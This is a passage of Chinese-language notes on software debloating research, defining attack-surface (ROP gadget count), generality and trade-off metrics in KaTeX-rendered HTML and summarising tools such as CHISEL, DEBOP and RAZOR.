xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>f</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">asurf()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mclose">)</span></span></span></span></eq>表示用程序包含的面向返回编程（ROP,Return-Oriented-Programming）小工具的数量来衡量程序的攻击面。<ul><li>ROP（Return-Oriented Programming）小工具是一系列机器指令的序列，通常以返回指令结束。攻击者可以利用漏洞（例如堆栈溢出）来覆盖一个小工具的返回地址，从而改变控制流并执行恶意代码。ROP小工具通常用于测量攻击面。我们使用ROPgadget工具来计算ROP小工具的数量。</li></ul></li></ul></li></ul><h5 id="2.2.2-%E9%80%9A%E7%94%A8%E6%80%A7" tabindex="-1">2.2.2 通用性</h5><ul><li>C通用性(correctness-based):收集另一个输入集合<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">I&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>,使得<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>∩</mo><mi>I</mi><mo>=</mo><mi mathvariant="normal">∅</mi></mrow><annotation encoding="application/x-tex">I&#x27; \cap I = \emptyset</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"></span><span class="mord">∅</span></span></span></span></eq>,有<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>g</mi><mi>e</mi><mi>n</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><msub><mo>∑</mo><mrow><msup><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>∈</mo><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow></msub><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><msup><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mi>p</mi><mo stretchy="false">(</mo><msup><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∣</mi><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">cgen(p&#x27;,I&#x27;)=\frac{\sum_{i&#x27;\in I&#x27;} p&#x27;(i&#x27;)=p(i&#x27;)}{|I&#x27;|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.654em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.134em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5546em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2854em;"><span style="top:-2.2854em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.6068em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8496em;"><span style="top:-2.8496em;margin-right:0.1em;"><span class="pstrut" style="height:2.5556em;"></span><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8496em;"><span style="top:-2.8496em;margin-right:0.1em;"><span class="pstrut" style="height:2.5556em;"></span><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3494em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.1952em;"></span><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose mtight">)</span><span class="mrel mtight">=</span><span class="mord mathnormal mtight">p</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></eq>,其中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mo separator="true">,</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(),p&#x27;()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mclose">)</span></span></span></span></eq>表示<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo separator="true">,</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">p,p&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>产生的输出,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|I&#x27;|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span></span></span></span></eq>表示输入的数量<ul><li>两种不同类型的C通用性<ul><li><ol><li>当<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">I&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>为输入全集时,得到的通用性称为 all-input-based c-generality</li></ol></li><li><ol start="2"><li>当𝐼’是一个包含与𝐼相关的输入（例如，用于测试类似功能）,得到的通用性称为 related-input-based c-generality</li></ol></li></ul></li></ul></li><li>R通用性(robustness-based):该指标衡量对于未被观测到的输入的适应能力,反映了程序的可靠性. 同样收集另一个输入集合<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">I&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>,使得<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>∩</mo><mi>I</mi><mo>=</mo><mi mathvariant="normal">∅</mi></mrow><annotation encoding="application/x-tex">I&#x27; \cap I = \emptyset</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"></span><span class="mord">∅</span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>g</mi><mi>e</mi><mi>n</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><msub><mo>∑</mo><mrow><msup><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>∈</mo><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow></msub><mi>r</mi><mi>o</mi><mi>b</mi><mi>u</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><msup><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∣</mi><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">rgen(p&#x27;,I&#x27;)=\frac{\sum_{i&#x27;\in I&#x27;} robust(p&#x27;(i&#x27;))}{|I&#x27;|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.654em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.134em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5546em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2854em;"><span style="top:-2.2854em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.6068em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8496em;"><span style="top:-2.8496em;margin-right:0.1em;"><span class="pstrut" style="height:2.5556em;"></span><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8496em;"><span style="top:-2.8496em;margin-right:0.1em;"><span class="pstrut" style="height:2.5556em;"></span><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3494em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.1952em;"></span><span class="mord mathnormal mtight">ro</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">t</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose mtight">))</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>o</mi><mi>b</mi><mi>u</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">robust()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ro</span><span class="mord mathnormal">b</span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mclose">)</span></span></span></span></eq>表示程序运行结束后是否崩溃(如 段错误). 本文通过生产 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq> 的fuzzed 版本得到<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">I&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq></li></ul><h5 id="2.2.3-%E7%AE%80%E5%8C%96%E5%BA%A6-%E9%80%9A%E7%94%A8%E6%80%A7-%E6%9D%83%E8%A1%A1" tabindex="-1">2.2.3 简化度-通用性 权衡</h5><ul><li>使用调和平均数,或F-score<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>r</mi><mi>e</mi><mi>d</mi><mo separator="true">,</mo><mi>g</mi><mi>e</mi><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mn>2</mn><mo>⋅</mo><mi>r</mi><mi>e</mi><mi>d</mi><mo>⋅</mo><mi>g</mi><mi>e</mi><mi>n</mi></mrow><mrow><mi>r</mi><mi>e</mi><mi>d</mi><mo>+</mo><mi>g</mi><mi>e</mi><mi>n</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">f(red,gen) = \frac{2\cdot red \cdot gen}{red+gen}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">re</span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.4133em;vertical-align:-0.4811em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">re</span><span class="mord mathnormal mtight">d</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4461em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mbin mtight">⋅</span><span class="mord mathnormal mtight">re</span><span class="mord mathnormal mtight">d</span><span class="mbin mtight">⋅</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4811em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></eq></li></ul><h3 id="03-%E7%9B%B8%E5%85%B3%E5%8E%BB%E8%86%A8%E8%83%80%E6%96%B9%E6%B3%95" tabindex="-1">03 相关去膨胀方法</h3><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>a</mi><mi>z</mi><mi>o</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">Razor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">zor</span></span></span></span></eq> 是 binary-based ,修改程序的二进制码</li><li>其他方法是 source-based ,修改程序源代码</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">CovA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">A</span></span></span></span></eq>和<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mi>F</mi></mrow><annotation encoding="application/x-tex">CovF</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span></eq>都是基于<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">Cov</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></eq>的,他们的强化方法也可以用到其它方法上</li></ul><h4 id="3.1-previous-input-based-approaches%3A-chisel%2Cdebop%2Crazor" tabindex="-1">3.1 Previous Input-Based Approaches: ChISEL,DEBOP,RAZOR</h4><ul><li><p>CHISEL是一种基于 强化学习引导(reinforcement-learning-guided),增量调试(delta-debugging-base)的 减量化(reduction-oriented) 去膨胀算法</p></li><li><p>DEBOP 是一种 多目标方法(multi-objective),考虑了三个因素(size reduction,attack surface reduction,generality),并在这三个因素中寻求平衡</p></li><li><p>RAZOR 是一种 基于 追踪(tracing),启发式增强(heuristic-based augmentation)和二进制重写(binary-rewriting) 的 二进制级的精简方法</p></li></ul><h4 